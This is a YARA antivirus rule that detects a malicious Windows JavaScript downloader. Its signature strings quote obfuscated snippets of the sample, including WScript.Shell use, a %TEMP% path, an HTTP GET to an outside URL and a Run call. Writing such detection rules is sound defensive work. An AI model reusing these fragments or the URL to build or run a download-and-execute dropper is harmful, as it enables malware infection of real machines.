rule sig_20160427_bade182280cd4c0a9b60bede57ecfbf3 {
  meta:
    description = "datamaliciousorder - file 20160427_bade182280cd4c0a9b60bede57ecfbf3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4ae68705dc40d37462d11056039306b3d45d7c580de1f3854b354eabcae4ec95"

  strings:
    $s1  = "function VoetiEeaym() {return HkhdfIvkiq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"0nAAp4Z" ascii
    $s2  = "function VoetiEeaym() {return HkhdfIvkiq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"0nAAp4Z" ascii
    $s3  = "var HkhdfIvkiq = function JhppeZcfsq() {return AfozaHeoqa[AsizpNrezo](\"WScript\"+\".Shell\");}(), SgbkdJqazd = 11;" fullword ascii
    $s4  = "function DtqgzMcbot(UgzxkYmjqf, UfgqmXdexe){PydpoYholu = PydpoYholu * 1; return UgzxkYmjqf - UfgqmXdexe;};" fullword ascii
    $s5  = "OrwgrWefdc[EceqqZxtnd](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var AfozaHeoqa = this[\"WScript\"];" fullword ascii
    $s7  = "function DniybBsuzh(){return IcgydBjfpl + \"\";};" fullword ascii
    $s8  = "if (OrwgrWefdc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function LyjtnLbynl() {return ((IheldGzsmi == true) && (IheldGzsmi == AvqlbUvygq)) ? 1 : PydpoYholu;};" fullword ascii
    $s10 = "function FkkvdLpjts(){return 23;};" fullword ascii
    $s11 = "function JkjqdKltho(BygrzWeufu) {var TycbbIfvkb = (1, 2, 3, 4, 5, BygrzWeufu); return TycbbIfvkb;};" fullword ascii
    $s12 = "var IheldGzsmi = false;" fullword ascii
    $s13 = "return DtqgzMcbot(SsrzeAjahq, AygwdLqvrg);" fullword ascii
    $s14 = "var EhdqfZbkeh = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function WtzklBsrot()" fullword ascii
    $s16 = "AvqlbUvygq = true; " fullword ascii
    $s17 = "function XkypcGvbhg(){return AsizpNrezo;};" fullword ascii
    $s18 = "CcrkjFdyix = true;" fullword ascii
    $s19 = "function RhpuyGkpfo(EgbalNobep){HkhdfIvkiq[\"R\"+\"un\"](EgbalNobep, PydpoYholu, PydpoYholu);};" fullword ascii
    $s20 = "var CcrkjFdyix = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}